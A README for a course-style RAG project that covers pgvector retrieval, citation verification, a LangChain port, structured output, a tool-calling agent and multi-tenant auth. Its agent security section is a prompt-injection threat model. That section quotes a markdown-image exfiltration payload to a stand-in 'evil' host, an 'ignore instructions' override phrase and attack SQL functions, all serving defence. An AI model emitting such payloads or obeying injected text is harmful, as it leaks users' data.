# RAG Pipeline — Week 5 complete, Week 6 underway

Week 5 builds retrieval-augmented generation without a framework, so every
step is visible. **Days 28-34 are all done** — ingestion through evaluation,
plus the Day 34 failure analysis and oral defense write-up at
[`docs/WEEK5_DEFENSE.md`](docs/WEEK5_DEFENSE.md).

**Week 6, Day 35** ports that same pipeline onto LangChain (`app/langchain_port/`,
`POST /ask/langchain`) — see the Week 6 section below.

**Week 6, Day 37** adds validated structured output with retry
(`POST /ask/structured`) — see "Week 6, Day 37" below.

> **Since Week 7 every endpoint except `/ping`, `/auth/*` and the chunk lab requires a
> `Authorization: Bearer <token>` header** (see "Week 7" at the bottom). The `curl` examples in
> the older sections predate that — add `-H "Authorization: Bearer $TOKEN"`.

**Week 6, Days 36 / 38 / 39** add a tool-calling agent with streaming and
a prompt-injection / scope threat model (`POST /agent`, `POST /agent/stream`)
— see "Week 6, Days 36 / 38 / 39" at the bottom and
[`docs/AGENT_THREAT_MODEL.md`](docs/AGENT_THREAT_MODEL.md).

```
Document -> parse -> clean -> chunk -> embed -> pgvector index      <- Day 29
Question -> embed -> retrieve top-k (+ metadata filters)            <- Day 30
         -> build prompt -> LLM -> cited, verified answer           <- Day 31
Eval     -> 30-question frozen set -> Precision@k, Recall@k, MRR     <- Day 32
Grid     -> chunk_size x top_k, 9 runs, one variable at a time       <- Day 33
Defense  -> failure analysis + 10-minute oral defense script         <- Day 34 (this commit)
```

## Run it

No API key needed -- embeddings run locally (see below).

```bash
docker compose up --build
```

The first document you upload will be slow (10-30s): fastembed downloads its
~130MB model on first use. It's cached in a Docker volume afterward, so
every upload after that is fast, and restarting the containers doesn't
re-download it.

Open **http://127.0.0.1:8000/** — the *chunk lab*. Paste text and change chunk
size / overlap to see chunks re-cut live (highlighted text is the overlap), or
upload a `.txt`, `.md` or `.pdf` to run the real pipeline: parse, clean, chunk,
embed, and store. The page is served by the API itself, so there is no CORS
setup and nothing to build. API docs are at `/docs`.

Tests need no Docker or API key: `pip install -r requirements.txt && pytest -v`
(the embedding provider is mocked, same "fast fake" approach as every other
provider call in this sprint).

## What each stage does, and why

**Parse** (`ingestion/parsers.py`) — file bytes to pages. PDFs keep their page
number; txt/md are a single page with no number.

**Clean** (`ingestion/cleaning.py`) — runs *before* chunking, so stored offsets
refer to the text we actually keep. It undoes hard line-wrapping, repairs
words split by a hyphen at a line break, folds ligatures (`ﬁ` -> `fi`) and
non-breaking spaces with Unicode NFKC, and strips control characters. Noise left
in here would end up inside embeddings and in the LLM's prompt.

**Chunk** (`ingestion/chunking.py`) — packs whole sentences (or list/heading
lines) into chunks up to `chunk_size` tokens, repeating the last
`chunk_overlap` tokens at the start of the next chunk. A single sentence
bigger than `chunk_size` falls back to being split by words.

**Embed** (`core/embeddings.py`, Day 29) — every chunk's text is embedded
LOCALLY via `fastembed` (ONNX Runtime, model `BAAI/bge-small-en-v1.5`, 384
dimensions) and stored on the chunk row. This is the ONLY place in the app
that generates embeddings, mirroring `llm_client.py` from the Week 4
project: one place to swap the model, one place to mock in tests. Since
fastembed is synchronous and CPU-bound, it runs in a worker thread
(`asyncio.to_thread`) rather than blocking the event loop. A model failure
is raised as `EmbeddingError` (502) — nothing is persisted for a document
whose embeddings couldn't be generated.

**Why local instead of a hosted embeddings API:** no API key, no billing,
no provider outage to handle, and no network dependency at request time —
at the cost of somewhat lower embedding quality than a large hosted model,
and a one-time ~130MB model download on first use (Groq, notably, has no
embeddings endpoint at all, despite some third-party client libraries
implying otherwise — chat, audio, and TTS only).

**Store** (`models/models.py`, `alembic/versions/8a1c2f9d4b3e_...py`) — the
embedding lives in a real `pgvector` column on Postgres, with an `ivfflat`
cosine-distance index built by the Day 29 migration
(`CREATE EXTENSION vector`, then the index). In tests, the same column falls
back to a plain JSON array under SQLite (`Vector(...).with_variant(JSON(),
"sqlite")`), since pgvector has no SQLite backend — same data, no real
Postgres or API key needed to run the suite.

**Retrieve** (`services/retrieval_service.py`, `routers/retrieval.py`, Day 30)
— `POST /retrieve` embeds the query with the same local model used at
ingestion, then returns the `top_k` chunks with the smallest cosine
distance. Metadata filters (`document_id`, `source_type`) narrow the
candidate set *before* ranking, not after — so `top_k` comes from the
filtered set instead of being padded out by irrelevant documents that
happened to rank low. Deliberately no LLM call in this endpoint: keeping
retrieval separate means its quality (did the right chunk come back at
all?) can be evaluated independently of answer quality (Day 31+).

On Postgres, the distance is computed *inside the database* via pgvector's
cosine-distance operator, using the Day 29 `ivfflat` index — an approximate
nearest-neighbor search, not a full scan, which is what makes this viable
at real corpus sizes. The test suite (SQLite) has no pgvector operator to
call, so it fetches the (test-scale) candidate rows and ranks them in
Python instead — correct for a handful of rows, and a direct illustration
of why the Postgres path needs an index rather than doing the same thing
at scale.

**A real bug caught and fixed while building this:** the first version
returned zero results against a real, populated Postgres database, with
no error at all. The cause was `ivfflat`'s `lists`/`probes` trade-off: the
Day 29 index splits the table into `lists = 100` clusters and, by
default, a search probes only **1** of them. On a small corpus (a handful
of documents, nowhere near 100 rows worth of real clustering), that one
probed cluster can easily contain none of the actual nearest vectors —
so the query runs successfully and returns nothing, which is a much
harder failure to notice than an error would be. Fixed with
`SET LOCAL ivfflat.probes = 100` before the query, scoped to that one
transaction so it can't leak onto a pooled connection reused by another
request. The trade-off: more probes means slower (but more accurate)
search — the right number for a real corpus depends on its size and
would be revisited once actual data volume is known, exactly the kind of
tuning the Day 33 chunk-size/top-k experiment log is for.

```bash
curl -X POST http://127.0.0.1:8000/retrieve \
  -H "Content-Type: application/json" \
  -d '{"query": "what does the chunk lab do?", "top_k": 3}'
```

**Answer with citations** (`services/generation_service.py`, `routers/ask.py`,
Day 31) — `POST /ask` runs the full pipeline: retrieve top-k chunks, build a
prompt that numbers and labels each one with its source (`[1] (handbook.pdf,
page 4)`), instruct the model to answer only from that numbered context and
cite every claim, then generate the answer.

This needs a real LLM, unlike embeddings — set `LLM_API_KEY` in `.env` (see
`.env.example`; defaults to Groq's chat endpoint, which is a genuinely
supported Groq feature, unlike their nonexistent embeddings endpoint). If
retrieval finds nothing, the LLM is never called at all: the refusal
("I don't know based on the provided documents.") is deterministic, not
hoped-for from the model.

**The citations are verified, not trusted.** A model told "never cite a
number that isn't in the context" can still do it anyway, so every `[N]` in
the answer is checked against the chunks that were actually retrieved.
A fabricated citation is dropped from the structured `citations` list and
flips `all_citations_valid` to `false` — the response tells you plainly
whether the model's citations can be trusted, rather than assuming they
can.

```bash
curl -X POST http://127.0.0.1:8000/ask \
  -H "Content-Type: application/json" \
  -d '{"query": "what does the chunk lab do?", "top_k": 3}'
```

## Week 6, Day 35 — LangChain port

`app/langchain_port/` ports the Day 30-31 pipeline onto LangChain's
`BaseRetriever` and LCEL (`prompt | llm`) chain abstractions, exposed at
`POST /ask/langchain` — the **identical** request and response contract as
`/ask`, so the same question can be sent to both endpoints and compared
directly:

```bash
curl -X POST http://127.0.0.1:8000/ask/langchain \
  -H "Content-Type: application/json" \
  -d '{"query": "what does the chunk lab do?", "top_k": 3}'
```

**`app/langchain_port/retriever.py`** — `PgVectorRetriever` is a thin adapter
over `retrieval_service.retrieve()` (Day 30). Nothing about retrieval itself
is reimplemented: the same pgvector cosine-distance query, the same
`ivfflat.probes` fix, the same metadata filters applied before ranking all
run exactly as before. What changes is the shape callers see — any LangChain
chain can now call `.ainvoke(query)` on it the same way it would call a
hosted vector-store-backed retriever.

**`app/langchain_port/chain.py`** — rebuilds `generation_service.ask()` (Day
31) as an LCEL chain (`ChatPromptTemplate | ChatOpenAI`), **reusing** the
exact same `SYSTEM_PROMPT`, `CITATION_RE`, and `NO_DOCUMENTS_ANSWER` from
`generation_service.py` rather than duplicating them — same grounding
instructions, same citation-verification rule, same deterministic refusal
when nothing is retrieved. Citations are checked here too, not trusted just
because this path runs through a framework.

### What LangChain actually replaced here (the sprint's own interview question)

- **`ChatOpenAI` replaces `core/llm_client.py`'s hand-rolled `_with_retries`
  wrapper.** LangChain's chat client has its own retry/timeout handling built
  in (`max_retries`, `timeout` constructor kwargs) — the exponential-backoff
  loop from Day 25/31 isn't needed in this file. The trade-off: that retry
  logic now lives inside a dependency, readable and testable only through
  LangChain's own code, not this repo's.
- **`ChatPromptTemplate` replaces the plain f-string message-building** in
  `generation_service.ask()`. For a two-message prompt like this one it's
  roughly a wash in lines of code — it starts earning its keep with
  multi-turn history or few-shot examples, neither of which this project
  needs yet.
- **What LangChain did *not* replace:** retrieval logic, the prompt's actual
  wording, or citation verification. All three are reused as-is from the
  hand-built version. The retriever is a thin adapter, not a rewrite.

A real bug found while building this port, worth knowing: `RunnableSequence`
(the object `prompt | llm` produces) is a Pydantic model, so
`monkeypatch.setattr(chain, "ainvoke", fake_fn)` on an existing instance
fails with `"RunnableSequence" object has no field "ainvoke"` — Pydantic v2
only allows assigning already-declared fields. The tests
(`tests/test_ask_langchain.py`) replace the whole module-level `_chain`
reference instead (see `FakeLangChainChain` in `tests/conftest.py`), which
sidesteps the restriction rather than fighting it.

**Evaluation** (`eval/`, Day 32) — `eval/eval_set.json` is a frozen set of 30
questions (10 factoid, 6 paraphrased, 6 loosely/ambiguously worded, 8
no-answer) against a small synthetic 3-document corpus
(`eval/corpus/`: a leave policy, a product FAQ, and a page of science
facts — picked specifically so the three are topically disjoint and
cross-document retrieval mistakes are obvious). Each labeled question is
tagged with its correct source document and an exact short phrase
(`gold_span`) that must appear in a correct retrieval.

`eval/run_eval.py` ingests the corpus, runs retrieval for every labeled
question, checks whether `gold_span` shows up in the top-k results, and
prints Precision@k, Recall@k, and MRR — overall and broken down by
question type. No-answer questions are reported separately (there's no
single "correct chunk" to score them against); instead it prints each
one's top-1 distance, so you can eyeball whether there's a gap that could
become a similarity threshold later.

```bash
docker compose cp eval api:/code/eval
docker compose exec api python eval/run_eval.py
```

**Why a single-relevant-item simplification, and why that's named
explicitly:** each question is scored against exactly one correct
passage, found by exact substring match, rather than a human-labeled set
of every passage that could answer it. This keeps the eval set cheap to
build and exactly reproducible, at the cost of not capturing questions
with multiple valid answers. Every number this script prints should be
read with that trade-off in mind — which is itself a legitimate thing to
say out loud in an interview, rather than presenting the metrics as more
rigorous than they are.

`run_eval.py` takes `--chunk-size`, `--chunk-overlap`, and `--top-k` as
command-line flags specifically so Day 33's chunk-size × k experiment
grid can call this exact script repeatedly with different values, rather
than being written from scratch. It also tracks retrieval latency
(average and p95) and an estimated prompt token count per question
(`system prompt + question + every retrieved chunk's stored token_count`),
both written into `eval/results_latest.json` alongside the quality metrics.

**Chunk-size × top-k grid** (`eval/run_grid.py`, Day 33) — calls
`run_eval.py`'s `run()` nine times, once per combination of
`chunk_size ∈ {250, 500, 1000}` × `top_k ∈ {3, 5, 10}`, holding overlap at
a fixed 10% of chunk_size so it never becomes a hidden third variable.
Everything else — the eval set, the embedding model, the prompt — stays
identical across all nine runs, which is the one rule Day 33 actually
insists on: change one thing at a time (or the full grid at once), never
let two variables move together, or a result can't be attributed to a
cause.

```bash
docker compose cp eval api:/code/eval
docker compose exec api python eval/run_grid.py
```

Prints a single summary table (Precision@k, Recall@k, MRR, average prompt
tokens, p95 latency, for all nine cells) and writes `eval/grid_results.json`
for later comparison. Each document gets re-ingested fresh at every new
chunk_size — Day 28's dedupe key is content hash *plus* chunk settings, so
a different chunk_size is correctly treated as a new ingestion, not a
duplicate; this is the dedupe design working as intended, not a special
case for the grid.

**A known artifact in this specific grid, named rather than hidden:** the
eval corpus is 3 short synthetic documents. At `chunk_size=1000`, each
document becomes only 1-2 chunks — fewer than `top_k=10` can even return.
Precision@10 on that row is mechanically capped at (total chunks)/10, not
a genuine signal about retrieval quality at that setting; the script
prints a `NOTE` line whenever this applies, and the grid summary repeats
the reminder at the bottom. Reading a metric without checking whether its
denominator assumption holds is a very easy mistake to make, and worth
calling out explicitly rather than presenting a misleading number
cleanly.

## The trade-offs (the interview-relevant part)

- **Chunk size.** Small chunks are precise but may lack the context to answer
  anything. Large chunks carry context but blur several topics into one
  embedding, so a match no longer tells you *which* part was relevant; they also
  spend more of the LLM's context window per retrieved chunk.
- **Overlap.** Protects against an answer straddling a boundary. Costs storage
  and embedding work (more chunks) and can return near-duplicate results.
- **Batching embeddings.** Fewer HTTP round-trips and lower latency per
  document, at the cost of one failure (after retries) discarding the whole
  document's ingestion rather than partially embedding it. Chosen because a
  half-embedded document is worse than a clean retry.
- **ivfflat vs exact search.** ivfflat is approximate — it trades a small
  amount of recall for speed at scale, unlike a brute-force scan over every
  vector. `lists = 100` is a placeholder; the right value depends on corpus
  size and gets revisited once real data volume is known (Day 30 retrieval
  evaluation touches this directly).

## Week 6, Day 37 — Structured output + retry on invalid model output

`POST /ask/structured` has the same request body, retrieval and grounding
rules as `/ask/langchain`, but the model must return a **validated JSON
object** instead of free text that we regex for `[N]`:

```bash
curl -X POST http://127.0.0.1:8000/ask/structured \
  -H "Content-Type: application/json" \
  -d '{"query": "what does the chunk lab do?", "top_k": 3}'
```

```json
{
  "query": "...", "answerable": true, "answer": "... [1]",
  "citations": [{"number": 1, "filename": "...", "...": "..."}],
  "retrieved_count": 3,
  "attempts": 2,
  "validation_errors": ["cited_sources: [99] do not exist; valid source numbers are 1..3"]
}
```

`attempts` and `validation_errors` expose the retry layer: `attempts: 0`
means the LLM was never called (nothing retrieved); `attempts > 1` means the
first reply broke the contract and was corrected.

### The contract (`GroundedAnswer`, `app/schemas.py`)

`answerable: bool`, `answer: str (non-empty)`, `cited_sources: list[int >= 1]`.
Internal consistency is enforced by a model validator: `answerable=true`
needs at least one citation; `answerable=false` must cite nothing. Duplicate
or unordered citations are *normalized*, not rejected — harmless noise isn't
worth a retry's tokens and latency.

### Three layers of defence (`app/langchain_port/structured.py`)

1. **Constrained decoding** — `response_format=json_schema` is bound onto the
   model. Cuts invalid output sharply; provider/model dependent; guarantees
   nothing about *meaning*.
2. **Schema validation** — Pydantic: types, ranges, internal consistency.
3. **Semantic validation** — checks needing request context: every cited
   number must exist in the retrieved set (a schema can't know how many
   chunks were retrieved). A fabricated citation is now a retryable failure,
   not just a flag.

On failure at layer 2 or 3, the model's bad output **and the exact error** are
appended as messages and it is asked again, up to `LLM_VALIDATION_RETRIES`
(default 2). After that: `502 invalid_model_output` with the per-attempt
errors in `details` — never a silently guessed answer.

### Trade-off memo: why this design, not the alternatives

- **Feed the error back vs. resend the same prompt.** At temperature > 0 a
  blind resend is a re-roll; telling the model what was wrong is a
  correction. Only the *last* failed attempt is fed back, so the prompt can't
  grow per retry; echoed bad output is capped at 2,000 chars (cost, and a
  smaller injection surface).
- **`bind(response_format=...)` + our own parse vs. `with_structured_output`.**
  The one-liner looked right and the mocked tests passed — then running the
  *real* LangChain/OpenAI-SDK path against a mocked HTTP server showed that
  with `json_schema` the SDK parses inside the call and **raises on bad
  output, even with `include_raw=True`**. The bad text never reaches a retry
  loop and a malformed reply becomes a 500. Owning the parse step puts every
  failure in one place with the raw text intact, for ~10 lines of code.
  (`tests/test_structured_wire.py` pins this down.)
- **Two retry layers, deliberately.** `ChatOpenAI(max_retries)` handles
  transport (timeout / 429 / 5xx). The validation loop handles "HTTP 200,
  wrong content". Provider `APIError`s (auth, bad request) are *not* re-asked:
  they fail identically every time. Worst-case calls per request =
  `(1 + LLM_VALIDATION_RETRIES) × (1 + LLM_MAX_RETRIES)` = 9 by default —
  know that number before putting this behind a rate limit.
- **Refusals are normalized** to the standard "I don't know…" string so all
  three `/ask*` endpoints refuse identically.
- **Settings, not code, for provider quirks:** `LLM_STRUCTURED_METHOD` =
  `json_schema` | `json_mode` | `none`. If a Groq model rejects `json_schema`,
  change the setting; validation + retry keeps the endpoint correct either
  way (just with more retries).

### Failure modes (documented)

| Situation | Behavior |
|---|---|
| Model returns prose / broken JSON | Retry with error feedback; 502 `invalid_model_output` after budget |
| Schema-valid but cites a non-existent source | Semantic failure → retry |
| Model says `answerable=false` | 200, normalized refusal, no citations |
| Nothing retrieved | LLM never called, `attempts: 0` |
| Provider down / auth error | 502 `provider_error`, no validation retry |
| Model wraps JSON in a ```` ```json ```` fence | Accepted without retry (formatting habit) |

### Likely interviewer questions

1. *"LLMs are nondeterministic — how do you build a reliable API on one?"*
   Define the contract, validate every output, retry with feedback, bound the
   retries, and fail loudly with a distinct error. Treat the model like any
   untrusted upstream.
2. *"If the provider supports JSON-schema mode, why validate again?"*
   Constrained decoding shapes syntax, not truth: it can still cite source 99
   of 3. And it's provider-dependent — validation is what makes the endpoint
   correct when the provider ignores or lacks it.
3. *"What does a retry cost?"* Latency and tokens per attempt, multiplied by
   the transport retry layer. Hence a small cap, error feedback (so retry 2
   usually works), and a metric on `attempts` to spot a regressing prompt or
   model.

### Not verified here

All 107 tests run offline; the real client/SDK request path is exercised with
a mocked HTTP server. **Not yet run against live Groq** — before trusting it,
call `/ask/structured` once with your real key and check `attempts` (and that
`openai/gpt-oss-20b` accepts `json_schema`; fall back to `json_mode` if not).

## Week 6, Days 36 / 38 / 39 — Tool-calling agent, streaming trace, injection + scope

`POST /agent` runs a small agent loop (written by hand, ~100 lines in
`app/agent/loop.py`, not a framework executor) with exactly **three tools**:

| Tool | What it does | Why it is bounded |
|---|---|---|
| `calculator` | exact arithmetic | AST-walked, numbers and `+ - * / // % **` only; exponent/base capped |
| `document_search` | pgvector retrieval, numbered `[N]` passages | scoped to the request's allowed documents; text returned as *untrusted* |
| `query_documents` | read-only SQL over document **metadata** | allowlist validator + scoped views + row limit + timeout + read-only txn |

```bash
# non-streaming: answer + full trace of tool calls
curl -X POST http://127.0.0.1:8000/agent -H "Content-Type: application/json" \
  -d '{"query": "How many documents do I have, and what is 25 * 12?"}'

# restrict what the agent may see / use
curl -X POST http://127.0.0.1:8000/agent -H "Content-Type: application/json" \
  -d '{"query": "leave policy?", "document_ids": [1], "allowed_tools": ["document_search"]}'

# streaming (SSE): tool_call / tool_result / tool_denied / token / final / done
curl -N -X POST http://127.0.0.1:8000/agent/stream -H "Content-Type: application/json" \
  -d '{"query": "What is the annual leave policy?"}'
```

PowerShell: `Invoke-RestMethod -Uri http://127.0.0.1:8000/agent -Method Post -ContentType "application/json" -Body (@{query="what is 25*12?"} | ConvertTo-Json) | ConvertTo-Json -Depth 8`

### The loop and why it terminates (Day 36 / 38)

```
messages = [system, question]
repeat <= max_steps:   stream reply
    no tool calls -> that reply is the answer, stop
    tool calls    -> run each (checked, bounded), append results, go again
steps exhausted while still calling tools -> "answer with what you have",
    tools unbound  (budget_exhausted = true)
```

Termination does not rely on the model behaving. Three independent stops:
`max_steps`, `max_tool_calls` (denied calls count too, so probing is bounded),
and duplicate-call rejection (the cheapest way to loop is to repeat yourself).
Bad calls — invalid arguments, unknown tools, rejected SQL — come back as
*results* the model can recover from; they never crash the loop.

Streaming: the model's reply is consumed with `astream`, tool-call fragments are
accumulated, and answer text is forwarded as `token` events as it settles.
Event order: `(tool_call, tool_result|tool_denied)*` → `token*` → `final` → `done`.
An `error` event replaces `done` on failure (the HTTP status is already 200 by then).

### Security: assume the model is compromised (Day 39)

Full write-up: [`docs/AGENT_THREAT_MODEL.md`](docs/AGENT_THREAT_MODEL.md). In short:

- **Authorization lives in code, not in the prompt.** Document scope and the tool
  allowlist are enforced by the executor from a server-built `AgentScope`; tool
  arguments (`extra="forbid"`) can never widen it.
- **Retrieved text is untrusted.** It is delimited, labelled, scanned by a heuristic
  detector (telemetry only — regexes are bypassable) and never trusted to be an
  instruction.
- **The output channel is sanitized**, including while streaming: markdown images,
  links, risky HTML and bare URLs are removed, closing the classic exfiltration route
  (model emits `![x](http://evil/?d=<stolen data>)`, the client renders it).
- **Tests assume an obedient attacker**: `tests/test_agent_security.py` scripts a model
  that follows every injected instruction, then proves nothing leaks.

### Trade-off memo: why this design

- **Hand-written loop vs. LangChain `AgentExecutor`.** The loop is short enough to
  read in one sitting and every safety decision (budgets, denial, sanitizing) lives in
  the one place it is enforced. A framework executor would hide exactly the part an
  interviewer asks about. Cost: we maintain it. LangChain still supplies the model
  client, tool binding and message types.
- **Three tools, not twenty.** Each tool is attack surface. All three are read-only and
  side-effect-free, so the worst a hijacked model can do is *read what the scope allows*.
  The first tool that can write or send anything needs a human-approval step.
- **Strict SQL allowlist, not a denylist.** A denylist always misses something
  (`pg_sleep`, `pg_read_file`, `UNION` tricks). The validator accepts only known
  keywords/functions/columns, then the query runs against *scoped views*
  (`scoped_documents`, `scoped_chunks`) with no text or embedding columns. Chunk text is
  deliberately unreachable from SQL: reading content must go through `document_search`,
  which numbers sources and wraps text as untrusted. **Production would add a dedicated
  read-only DB role** — a layer the application cannot get wrong. Not implemented here.
- **Scope pushed into the query *and* re-checked on results.** Query-level filtering
  keeps `top_k` slots for in-scope chunks; the recheck means a future retrieval bug
  can't leak. Each layer has its own test (mutation-checked).
- **Sanitize the output rather than trust the model not to emit links.** The agent has no
  legitimate reason to output a URL, so it outputs none. The streaming sanitizer holds
  back unfinished constructs and is tested to equal the batch sanitizer for any chunking.
- **Where scope comes from.** Since Week 7 the agent's document scope is computed server-side
  from the authenticated caller (tenant, role, private visibility); the request's `document_ids`
  can only *narrow* it. (In Week 6 it came straight from the request body — not a security
  boundary — which is why this was the top residual risk in the threat model.)

### Failure modes (documented)

| Situation | Behavior |
|---|---|
| Model asks for a document outside scope | `tool_denied`; same message whether the id exists or not (no existence oracle) |
| Model calls a tool the request didn't allow | `tool_denied`; the tool never runs |
| Model invents arguments (`tenant_id`, `document_ids`) | `invalid arguments` result; scope unchanged |
| Poisoned document says "ignore instructions…" | flagged in trace + logged; tools/scope/sanitizer still bound the damage |
| Model emits image/link/URL in the answer | removed from `answer` and from streamed tokens |
| Malformed or hostile SQL | rejected with a short reason; DB untouched |
| Runaway SQL | statement timeout (Postgres), rollback, session stays usable |
| Model loops / repeats a call | duplicate rejected; step and tool-call budgets force a final answer |
| Oversized tool output | truncated to `AGENT_MAX_TOOL_OUTPUT_CHARS` before it reaches the model |
| Provider down | `/agent` → 502 `provider_error`; `/agent/stream` → `error` event |

### Likely interviewer questions

1. *"How do you defend against prompt injection?"* — You can't make the model
   immune, so you bound what a hijacked model can do: authorization in code, read-only
   least-privilege tools, scope enforced outside the model, a closed output channel,
   and tests that assume the model obeys the attacker.
2. *"Who decides which documents the agent can see?"* — The server, from the authenticated
   principal. A request field can only narrow that set, never widen it.
3. *"Why not let the model write arbitrary SQL?"* — Allowlist + scoped views + limits
   + (in production) a read-only role; and chunk text is excluded so content access
   always goes through the cited, untrusted-wrapped path.
4. *"When shouldn't you use an agent?"* — When one retrieval + one generation answers
   the question: direct RAG is cheaper, faster, and has far less attack surface.
   (The measured comparison is Sunday's memo.)

### Verified vs. not verified

- **Verified (offline; the suite is now 382 tests, see Week 7):** loop, tools, SQL guard, scope, sanitizer
  (including chunking equivalence), injection scenarios with a scripted obedient model,
  and the real LangChain/OpenAI-SDK request + streaming path against a mocked server.
- **Verified on real Postgres 16 + pgvector (separate script, not in the suite):** the
  same loop sequence, scoped SQL views, read-only transaction, statement timeout +
  recovery, row limit.
- **Not verified:** a live Groq run of the agent. Tool calling quality varies by model —
  `llama-3.1-8b-instant` and `openai/gpt-oss-20b` may differ in how reliably they emit
  valid tool calls. Run it once and watch `trace` before trusting it.
- **Known gaps:** the injection detector is heuristic; no per-tenant/user rate limiting on the
  agent endpoints (each request can cost up to `max_steps + 1` model calls); no
  human-approval step because there are no write tools; SQL role hardening is a
  production recommendation, not implemented.

## Week 7 — Multi-tenant platform: auth, RBAC, tenant isolation, migrations

Design, decisions, failure modes and interview answers: [`docs/WEEK7_TENANCY.md`](docs/WEEK7_TENANCY.md).
Week 6's agent-vs-RAG memo: [`docs/WEEK6_AGENT_VS_RAG.md`](docs/WEEK6_AGENT_VS_RAG.md).

### Quick start

```bash
docker compose up -d --build        # migrations run automatically (tenancy + row-level security)

# 1. create a tenant and its first user (the OWNER) -- returns a token
curl -s -X POST http://127.0.0.1:8000/auth/register -H "Content-Type: application/json" \
  -d '{"tenant_name": "Acme", "email": "owner@acme.test", "password": "a-strong-password"}'
TOKEN=...   # paste access_token from the response (or POST /auth/login later)

# 2. use it
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8000/me
curl -s -H "Authorization: Bearer $TOKEN" -F "file=@notes.txt" \
  "http://127.0.0.1:8000/documents?chunk_size=500&chunk_overlap=0&visibility=private"
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  http://127.0.0.1:8000/ask/structured -d '{"query": "what does the document say?"}'

# 3. teammates (owner/admin): create users, change roles
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  http://127.0.0.1:8000/users -d '{"email": "ed@acme.test", "password": "another-password", "role": "editor"}'
```

PowerShell:

```powershell
$r = Invoke-RestMethod -Uri http://127.0.0.1:8000/auth/register -Method Post -ContentType "application/json" `
  -Body (@{tenant_name="Acme"; email="owner@acme.test"; password="a-strong-password"} | ConvertTo-Json)
$h = @{ Authorization = "Bearer $($r.access_token)" }
Invoke-RestMethod -Uri http://127.0.0.1:8000/me -Headers $h
Invoke-RestMethod -Uri http://127.0.0.1:8000/documents -Headers $h
```

**Your existing documents** (ingested before tenancy) were adopted by a tenant called `default` during the
migration. To reach them, give that tenant an owner:

```bash
docker compose exec api python -m app.cli.bootstrap_owner --email you@example.com --password 'a-strong-password'
```

### New endpoints

| Endpoint | Who | Notes |
|---|---|---|
| `POST /auth/register`, `POST /auth/login`, `GET /me` | public / any | JWT bearer tokens |
| `GET/POST /users`, `PATCH /users/{id}` | admin+ | role/active changes follow the rules in WEEK7_TENANCY.md |
| `GET /audit` | admin+ | the tenant's own audit trail |
| `PATCH /documents/{id}` | owner of the doc, or admin+ | title / visibility; send `expected_version` (409 on stale) |
| `DELETE /documents/{id}` | owner of the doc, or admin+ | soft delete (204) |
| everything else (`/documents`, `/retrieve`, `/ask*`, `/agent*`) | by role | now tenant- and visibility-scoped |

### Isolation in one paragraph

Every read goes through one `AccessFilter` (tenant, soft delete, private visibility); retrieval *requires* it, so
forgetting to scope a query is a `TypeError`, not a leak; foreign ids return **404, not 403**; and Postgres
**row-level security** enforces the tenant again underneath (fail-closed). `JWT_SECRET` must be set for any
non-development environment — the app refuses to start on the default.

### Tests and verification

```bash
pytest -q                                   # offline suite (SQLite; no Docker, no API key)
python scripts/verify_postgres.py --admin-url postgresql+asyncpg://USER:PASS@HOST:5432/postgres
```

The second command needs a reachable Postgres with pgvector and `CREATEDB` rights; it builds a throwaway
database and checks the migrations (legacy data, both directions, no drift), row-level security, and the real API
end to end (44 checks). Not part of `pytest` because it needs a live server — run it before trusting a schema change.

```bash
python eval/run_compare.py --email you@example.com --password '...'   # direct vs structured vs agent, needs your live API + LLM key
```

### Still to do in the capstone (Thu–Sun of Week 7, then Week 8)

Async ingestion with status transitions and idempotency (needs a queue + worker), conversational RAG with history,
per-tenant quotas / rate limits and metrics, the distributed-SQL lab; then collaborative editing (Yjs), explicit
locks, failure drills and load tests.
